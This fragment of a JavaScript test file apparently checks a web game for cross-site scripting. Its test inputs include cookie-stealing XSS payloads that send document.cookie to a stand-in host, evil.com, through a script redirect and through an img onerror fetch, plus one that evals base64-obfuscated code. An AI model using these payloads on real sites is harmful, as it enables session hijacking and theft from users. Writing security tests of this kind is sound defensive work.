    ...
    not: {
      toContain(expected) {
        if (!actual.includes(expected)) {
          ...
          console.log(`❌ FAIL: "${actual}" contains "${expected}" (should not)`);
          testResults.failed++;
        }
        testResults.total++;
      }
...
test('Reflected XSS in search parameter', () => {
  const searchQuery = '<script>document.location="http://evil.com/cookie="+document.cookie</script>';
...
test('Persistent XSS in comment field', () => {
  const comment = 'Nice game! <img src="x" onerror="fetch(\'http://evil.com/steal\', {method:\'POST\', body:document.cookie})">';
...
test('DOM XSS via innerHTML simulation', () => {
  const userInput = '<img src=x onerror="eval(atob(\'YWxlcnQoZG9jdW1lbnQuY29va2llKQ==\'))">';
